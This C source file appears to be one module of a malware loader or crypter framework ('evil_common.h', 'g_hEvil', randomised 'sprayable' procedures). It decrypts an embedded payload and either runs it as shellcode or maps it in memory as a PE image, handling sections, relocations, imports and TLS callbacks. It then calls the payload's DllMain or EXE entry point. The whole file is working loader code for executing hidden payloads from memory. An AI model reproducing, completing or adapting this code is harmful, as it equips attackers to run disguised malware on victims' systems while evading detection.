//@@@headers
#include "pay.h"
#include "alloc.h"
#include "locate.h"
#include "lpfns.h"
#include "decrypt.h"
#include "PART_INFO_DEFS.h" // XXX_POSSIBLE, etc.
#include "check_payload_info.h" // PAYLOAD_XXX
#include "evil_common.h"
#include "dbg.h"
//@@@endheaders

#ifndef PAYLOAD_SHELLCODE
//@@@headers
#include "ldr.h"
//@@@endheaders
#endif


//@@@privdefs
#define DIRENTRY_BASERELOC IMAGE_DIRECTORY_ENTRY_BASERELOC
#define DIRENTRY_IMPORT IMAGE_DIRECTORY_ENTRY_IMPORT
#define DIRENTRY_TLS IMAGE_DIRECTORY_ENTRY_TLS
//@@@endprivdefs

//@@@zvars
PVOID pay_lpPayloadToUse;
DWORD pay_dwPayloadToUseLen;

#ifndef PAYLOAD_SHELLCODE
LPVOID pay_lpEntryPoint;
IMAGE_DOS_HEADER* pay_pTmpHdrs;
#endif

//@@@endzvars


// ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

static SPRAYABLE_PROC(pay_dup_located) {
  //@@@proc /name pay_dup_located
  Z(pay_lpPayloadToUse) = malloc(Z(locate_paydatalen));
  memcpy(Z(pay_lpPayloadToUse), Z(locate_paydata), Z(locate_paydatalen));
  Z(pay_dwPayloadToUseLen) = Z(locate_paydatalen);
  //@@@endproc
}

static SPRAYABLE_PROC(pay_dup_located_if) {
  //@@@proc /name pay_dup_located_if
  if (Z(locate_bReadOnly)) { _CALL(pay_dup_located); }
  if (!Z(locate_bReadOnly)) { Z(pay_lpPayloadToUse) = Z(locate_paydata);  Z(pay_dwPayloadToUseLen) = Z(locate_paydatalen); }
  //@@@endproc
}

static SPRAYABLE_PROC(pay_decrypt) {
  //@@@proc /name pay_decrypt
  CHILD_A1 = Z(pay_lpPayloadToUse);
  CHILD_A2D = Z(pay_dwPayloadToUseLen);
  _CALL(decrypt);
  //@@@endproc
}


SPRAYABLE_PROC(pay_read) {
  //@@@proc /name pay_read
  _CALL(pay_dup_located_if); dbgprn("decrypting...\n");
  _CALL(pay_decrypt);

#ifdef PAYLOAD_SHELLCODE

  dbgprn("copying sc..\n");memcpy(Z(alloc_lpImage), Z(pay_lpPayloadToUse), Z(pay_dwPayloadToUseLen));

#else
  // need to save hdrs, cuz gonna _CALL(unlocate) soon (if possible)
  Z(pay_pTmpHdrs) = (IMAGE_DOS_HEADER*)malloc(_fka(1500,10000)); //#DirtyBinding !!!
  dbgprn("copying tmphdrs..\n");memcpy(Z(pay_pTmpHdrs), Z(pay_lpPayloadToUse), 1300 + _fkb(15,200)); //#DirtyBinding !!!

  Z(ldr_pNtHdrs) = (IMAGE_NT_HEADERS*)((DWORD_PTR)Z(pay_pTmpHdrs) + Z(pay_pTmpHdrs)->e_lfanew);
  Z(ldr_pOptHdr) = (IMAGE_OPTIONAL_HEADER*)&Z(ldr_pNtHdrs)->OptionalHeader;
  Z(ldr_pSecHdrs) = (IMAGE_SECTION_HEADER*)((DWORD_PTR)Z(ldr_pOptHdr) + Z(ldr_pNtHdrs)->FileHeader.SizeOfOptionalHeader);
  Z(ldr_pDataDir) = Z(ldr_pOptHdr)->DataDirectory;
  Z(protsec_lpTargetImage) = Z(alloc_lpImage); // only for ldr_prot_sec

  CHILD_A1 = Z(alloc_lpImage);
  CHILD_A2 = Z(pay_lpPayloadToUse);

#ifndef PAYLOAD_STOMP
  // Copy PE headers
  dbgprn("publishing hdrs..\n"); memcpy(Z(alloc_lpImage), Z(pay_lpPayloadToUse), 2048+_fkb(100,1000)); //#DirtyBinding !!!
#endif

  dbgprn("copying sect..\n");_CALL(ldr_copy_sections);
#endif // PAYLOAD_SHELLCODE


  if (Z(locate_bReadOnly)) { free(Z(pay_lpPayloadToUse)); }

#ifdef UNLOCATE_POSSIBLE
  _CALL(unlocate);
#else
#ifndef UNLOCATE_NOT_POSSIBLE
#error("One of UNLOCATE_POSSIBLE/UNLOCATE_NOT_POSSIBLE must be defined")
#else
  // can't unlocate, it's not possible
#endif
#endif
  //@@@endproc
}

// ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


#ifndef PAYLOAD_SHELLCODE
SPRAYABLE_PROC(pay_mz_setup) {
  //@@@proc /name pay_mz_setup
  /* nothing to do, leave for simplicity */
  CHILD_A1 = Z(alloc_lpImage);
  if (Z(ldr_pDataDir[DIRENTRY_BASERELOC].VirtualAddress) && Z(ldr_pDataDir[DIRENTRY_BASERELOC].Size)) { _CALL(ldr_process_relocs); }
  if (Z(ldr_pDataDir[DIRENTRY_IMPORT].VirtualAddress)    && Z(ldr_pDataDir[DIRENTRY_IMPORT].Size))    { _CALL(ldr_process_imports); }
  //@@@endproc
}

SPRAYABLE_PROC(pay_mz_setup_post) {
  //@@@proc /name pay_mz_setup_post
  /* nothing to do, leave for simplicity */
  // Process TLS if present.
  if (Z(ldr_pDataDir[DIRENTRY_TLS].VirtualAddress) && Z(ldr_pDataDir[DIRENTRY_TLS].Size)) { dbgprn("TLS present, doing ldr_call_tls_callbacks\n");  _CALL(ldr_call_tls_callbacks); }
  //@@@endproc
}
#endif


// ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

static SPRAYABLE_PROC(pay_dllmain_fail) {
  //@@@proc /name pay_dllmain_fail
#ifdef PAYLOAD_SHELLCODE
  ((LPFN_shellcode)Z(alloc_lpImage))();
#else
  ((LPFN_DllMain)Z(pay_lpEntryPoint))((HMODULE)Z(alloc_lpImage), DLL_PROCESS_DETACH, 0); dbgprn("DEALLOCATED AFTER DllMain FAIL\n");
#endif
#ifdef DEALLOC_POSSIBLE
  _CALL(dealloc);
#endif
  //@@@endproc
}



SPRAYABLE_PROC(pay_call) {
  //@@@proc /name pay_call
#ifdef PAYLOAD_SHELLCODE

  // ### Call shellcode as 0-arg proc ###
  Z(g_dwP2Ret) = (DWORD)((LPFN_shellcode)Z(alloc_lpImage))();

#else
  Z(pay_lpEntryPoint) = (PVOID)((DWORD_PTR)Z(alloc_lpImage) + Z(ldr_pOptHdr)->AddressOfEntryPoint);  dbgprn(" !!!CALLING lpEntryPoint = %p !!!\n", Z(pay_lpEntryPoint));

#ifdef PAYLOAD_DLL
  Z(g_hEvil) = (HMODULE)Z(alloc_lpImage);
  Z(g_dwP2Ret) = ((LPFN_DllMain)Z(pay_lpEntryPoint))( (HMODULE)Z(alloc_lpImage), DLL_PROCESS_ATTACH, 0 );
  if (FALSE == Z(g_dwP2Ret)) { _CALL(pay_dllmain_fail); }
#endif

#ifdef PAYLOAD_EXE
  Z(g_dwP2Ret) = (DWORD)((LPFN_ExeEntry)Z(pay_lpEntryPoint))( );
#ifdef DEALLOC_POSSIBLE
  _CALL(dealloc);
#endif
#endif

#endif

  //@@@endproc
}


